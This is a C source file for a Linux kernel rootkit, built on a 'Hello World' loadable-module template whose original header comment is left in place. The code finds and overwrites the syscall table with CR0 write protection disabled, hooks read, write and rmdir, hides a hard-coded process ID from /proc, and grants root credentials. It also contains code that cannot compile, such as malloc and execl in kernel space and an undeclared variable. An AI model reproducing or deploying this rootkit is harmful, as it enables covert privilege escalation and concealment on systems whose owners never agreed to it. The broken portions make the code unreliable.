/**
 * @file    hello.c
 * @author  Derek Molloy
 * @date    4 April 2015
 * @version 0.1
 * @brief  An introductory "Hello World!" loadable kernel module (LKM) that can display a message
 * in the /var/log/kern.log file when the module is loaded and removed. The module can accept an
 * argument when it is loaded -- the name, which appears in the kernel log files.
 * @see http://www.derekmolloy.ie/ for a full description and follow-up descriptions.
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <getopt.h>
#include <unistd.h>


#include <linux/init.h>   // Macros used to mark up functions e.g., __init __exit
#include <linux/module.h> // Core header for loading LKMs into the kernel
#include <linux/kernel.h> // Contains types, macros, functions for the kernel

#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/sysfs.h>
#include <linux/uaccess.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/limits.h>
#include <linux/delay.h>
#include <linux/namei.h>



MODULE_LICENSE("GPL");                              ///< The license type -- this affects runtime behavior
MODULE_AUTHOR("Moder amn security flbank elmasry"); ///< The author -- visible when you use modinfo
MODULE_DESCRIPTION("A grootkit haha");              ///< The description -- see modinfo
MODULE_VERSION("0.1");                              ///< The version of the module

static char *name = "world";                                        ///< An example LKM argument -- default value is "world"
module_param(name, charp, S_IRUGO);                                 ///< Param desc. charp = char ptr, S_IRUGO can be read/not changed
MODULE_PARM_DESC(name, "The name to display in /var/log/kern.log"); ///< parameter description
static char *proc_to_hide = "7821";
static struct file_operations proc_fops;
static struct file_operations *backup_proc_fops;
static struct inode *proc_inode;
static struct path p;

struct dir_context *backup_ctx;



void **sys_call_table;

#include "config.h"


#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

#if defined __i386__
    #define START_ADDRESS 0xc0000000
    #define END_ADDRESS 0xd0000000
#elif defined __x86_64__
    #define START_ADDRESS 0xffffffff81000000
    #define END_ADDRESS 0xffffffffa2000000
#else
    #error ARCH_ERROR_MESSAGE
#endif
/**
 * Finds a system call table based on a heruistic.
 * Note that the heruistic is not ideal, so it might find a memory region that
 * looks like a system call table but is not actually a system call table, but
 * it seems to work all the time on my systems.
 *
 * @return system call table on success, NULL on failure.
 */
void **find_syscall_table(void)
{
    void **sctable;
    void *i = (void*) START_ADDRESS;

    while (i < END_ADDRESS) {
        sctable = (void **) i;

        // sadly only sys_close seems to be exported -- we can't check against more system calls
        if (sctable[__NR_close] == (void *) sys_close) {
            size_t j;
            // we expect there to be at least 300 system calls
            const unsigned int SYS_CALL_NUM = 300;
            // sanity check: no function pointer in the system call table should be NULL
            for (j = 0; j < SYS_CALL_NUM; j ++) {
                if (sctable[j] == NULL) {
                    // this is not a system call table
                    goto skip;
                }
            }
            return sctable;
        }
skip:
        ;
        i += sizeof(void *);
    }

    return NULL;
}


struct hook {
    void *original_function;
    void *modified_function;
    void **modified_at_address;
    struct list_head list;
};

LIST_HEAD(hook_list);

int hook_create(void **modified_at_address, void *modified_function)
{
    struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);

    if (!h) {
        return 0;
    }

    h->modified_at_address = modified_at_address;
    h->modified_function = modified_function;
    list_add(&h->list, &hook_list);

    DISABLE_W_PROTECTED_MEMORY
    h->original_function = xchg(modified_at_address, modified_function);
    ENABLE_W_PROTECTED_MEMORY

    return 1;
}


/**
 * Get original function pointer based on the one we overwrote it with.
 * Useful when wanting to call the original function inside a hook.
 *
 * @param modified_function The function that overwrote the original one.
 * @return original function pointer on success, NULL on failure.
 */
void *hook_get_original(void *modified_function)
{
    void *original_function = NULL;
    struct hook *h;

    list_for_each_entry(h, &hook_list, list) {
        if (h->modified_function == modified_function) {
            original_function = h->original_function;
            break;
        }
    }
    return original_function;
}


void hook_remove_all(void)
{
    struct hook *h, *tmp;

    // make it so that instead of `modified_function` the `original_function`
    // would get called again
    list_for_each_entry(h, &hook_list, list) {
        DISABLE_W_PROTECTED_MEMORY
        *h->modified_at_address = h->original_function;
        ENABLE_W_PROTECTED_MEMORY
    }
    // a hack to let the changes made by the loop above propagate
    // as some process might be in the middle of our `modified_function`
    // and call `hook_get_original()`, which would return NULL if we
    // `list_del()` everything
    // so we make it so that instead of `modified_function` the
    // `original_function` would get called again, then sleep to wait until
    // existing `modified_function` calls finish and only them remove elements
    // fro mthe list
    msleep(10);
    list_for_each_entry_safe(h, tmp, &hook_list, list) {
        list_del(&h->list);
        kfree(h);
    }
}

unsigned long read_count = 0;

asmlinkage long read(unsigned int fd, char __user *buf, size_t count)
{
    read_count ++;

    asmlinkage long (*original_read)(unsigned int, char __user *, size_t);
    original_read = hook_get_original(read);
    return original_read(fd, buf, count);
}


unsigned long write_count = 0;

asmlinkage long write(unsigned int fd, const char __user *buf, size_t count)
{
    write_count ++;

    asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);
    original_write = hook_get_original(write);
    return original_write(fd, buf, count);
}


// ========== ASM HOOK LIST ==========

#if defined __i386__
    // push 0x00000000, ret
    #define ASM_HOOK_CODE "\x68\x00\x00\x00\x00\xc3"
    #define ASM_HOOK_CODE_OFFSET 1
    // alternativly we could do `mov eax 0x00000000, jmp eax`, but it's a byte longer
    //#define ASM_HOOK_CODE "\xb8\x00\x00\x00\x00\xff\xe0"
#elif defined __x86_64__
    // there is no push that pushes a 64-bit immidiate in x86_64,
    // so we do things a bit differently:
    // mov rax 0x0000000000000000, jmp rax
    #define ASM_HOOK_CODE "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"
    #define ASM_HOOK_CODE_OFFSET 2
#else
    #error ARCH_ERROR_MESSAGE
#endif

struct asm_hook {
    void *original_function;
    void *modified_function;
    char original_asm[sizeof(ASM_HOOK_CODE)-1];
    struct list_head list;
};

LIST_HEAD(asm_hook_list);

/**
 * Patches machine code of the original function to call another function.
 * This function should not be called directly.
 */
void _asm_hook_patch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, ASM_HOOK_CODE, sizeof(ASM_HOOK_CODE)-1);
    *(void **)&((char *)h->original_function)[ASM_HOOK_CODE_OFFSET] = h->modified_function;
    ENABLE_W_PROTECTED_MEMORY
}

/**
 * Patches machine code of a function so that it would call our function.
 * Keeps record of the original function and its machine code so that it could
 * be unpatched and patched again later.
 *
 * @param original_function Function to patch
 *
 * @param modified_function Function that should be called
 *
 * @return true on success, false on failure.
 */
int asm_hook_create(void *original_function, void *modified_function)
{
    struct asm_hook *h = kmalloc(sizeof(struct asm_hook), GFP_KERNEL);

    if (!h) {
        return 0;
    }

    h->original_function = original_function;
    h->modified_function = modified_function;
    memcpy(h->original_asm, original_function, sizeof(ASM_HOOK_CODE)-1);
    list_add(&h->list, &asm_hook_list);

    _asm_hook_patch(h);

    return 1;
}
void asm_hook_patch(void *modified_function)
{
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_patch(h);
            break;
        }
    }
}

/**
 * Unpatches machine code of the original function, so that it wouldn't call
 * our function anymore.
 * This function should not be called directly.
 */
void _asm_hook_unpatch(struct asm_hook *h)
{
    DISABLE_W_PROTECTED_MEMORY
    memcpy(h->original_function, h->original_asm, sizeof(ASM_HOOK_CODE)-1);
    ENABLE_W_PROTECTED_MEMORY
}

/**
 * Unpatches machine code of the original function, so that it wouldn't call
 * our function anymore.
 *
 * @param modified_function Function that the original function was patched to
 * call in asm_hook_create().
 */
void *asm_hook_unpatch(void *modified_function)
{
    void *original_function = NULL;
    struct asm_hook *h;

    list_for_each_entry(h, &asm_hook_list, list) {
        if (h->modified_function == modified_function) {
            _asm_hook_unpatch(h);
            original_function = h->original_function;
            break;
        }
    }

    return original_function;
}

/**
 * Removes all hook records, unpatches all functions.
 */
void asm_hook_remove_all(void)
{
    struct asm_hook *h, *tmp;

    list_for_each_entry_safe(h, tmp, &asm_hook_list, list) {
        _asm_hook_unpatch(h);
        list_del(&h->list);
        kfree(h);
    }
}


// ========== END ASM HOOK LIST ==========


unsigned long asm_rmdir_count = 0;

asmlinkage long asm_rmdir(const char __user *pathname)
{
    asm_rmdir_count ++;

    asmlinkage long (*original_rmdir)(const char __user *);
    original_rmdir = asm_hook_unpatch(asm_rmdir);
    long ret = original_rmdir(pathname);
    asm_hook_patch(asm_rmdir);

    return ret;
}






static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
                        loff_t off, u64 ino, unsigned int d_type)
{
    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
        return 0;

    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
}

struct dir_context rk_ctx = {
    .actor = rk_filldir_t,
};

int rk_iterate_shared(struct file *file, struct dir_context *ctx)
{
    int result = 0;
    rk_ctx.pos = ctx->pos;
    backup_ctx = ctx;
    result = backup_proc_fops->iterate(file, &rk_ctx);
    ctx->pos = rk_ctx.pos;

    return result;
}

/** @brief The LKM initialization function
 *  The static keyword restricts the visibility of the function to within this C file. The __init
 *  macro means that for a built-in driver (not a LKM) the function is only used at initialization
 *  time and that it can be discarded and its memory freed up after that point.
 *  @return returns 0 if successful
 */


struct file_operations *get_fop(const char *path)
{
    struct file *file;

    if ((file = filp_open(path, O_RDONLY, 0)) == NULL) {
        return NULL;
    }

    struct file_operations *ret = (struct file_operations *) file->f_op;
    filp_close(file, 0);

    return ret;
}

void write_buffer(char **dest_ptr, char *src, size_t size)
{
    memcpy(*dest_ptr, src, size);
    *dest_ptr += size;
}



static int __init rootkit_init(void)
{
    printk(KERN_INFO "rootkit says: Greatings %s starting engine!\n", name);

    /*invisble kernel module*/
    // list_del_init(&__this_module.list);
    // kobject_del(&THIS_MODULE->mkobj.kobj);
    // printk("invisible: module loaded\n");
    /*end invisible lsmod kernel*/

    /* grant root access */

    buf_size += sizeof(CFG_PASS);
    buf_size += sizeof(CFG_ROOT);
    buf_size += 1;

    char *buf = malloc(buf_size);
    buf[buf_size - 1] = 0;

    char *buf_ptr = buf;

    write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));

    write_buffer(&buf_ptr, CFG_ROOT, sizeof(CFG_ROOT));

    execl("/bin/bash", "bash", NULL);




    /*hide process from list of proccesess*/
    if (kern_path("/proc", 0, &p))
        return 0;

    /* get the inode*/
    proc_inode = p.dentry->d_inode;

    /* get a copy of file_operations from inode */
    proc_fops = *proc_inode->i_fop;
    /* backup the file_operations */
    backup_proc_fops = proc_inode->i_fop;
    /* modify the copy with out evil function */
    proc_fops.iterate = rk_iterate_shared;
    /* overwrite the active file_operations */
    proc_inode->i_fop = &proc_fops;




    //asm_hook_create(get_fop("/")->iterate, root_iterate);

    sys_call_table = find_syscall_table();
    pr_info("Found sys_call_table at %p\n", sys_call_table);

    asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);

    hook_create(&sys_call_table[__NR_read], read);
    hook_create(&sys_call_table[__NR_write], write);

    struct cred *creds = prepare_creds();
    if (creds==NULL)
        printk(KERN_INFO "can not grant root acces\n");
    else
    {
        creds->uid.val = creds->euid.val = 0;
        creds->gid.val = creds->egid.val = 0;
        commit_creds(creds);
        printk(KERN_INFO "rootkit says: Granted toot access\n", name);
    }

    return 0;
}

/** @brief The LKM cleanup function
 *  Similar to the initialization function, it is static. The __exit macro notifies that if this
 *  code is used for a built-in driver (not a LKM) that this function is not required.
 */
static void __exit rootkit_exit(void)
{
    printk(KERN_INFO "rootkit says: Parking %s Engine off!\n", name);
    if(kern_path("/proc", 0, &p))
        return;
    proc_inode = p.dentry->d_inode;

    hook_remove_all();
    asm_hook_remove_all();


    proc_inode->i_fop = backup_proc_fops;

}

/** @brief A module must use the module_init() module_exit() macros from linux/init.h, which
 *  identify the initialization function at insertion time and the cleanup function (as
 *  listed above)
 */
module_init(rootkit_init);
module_exit(rootkit_exit);
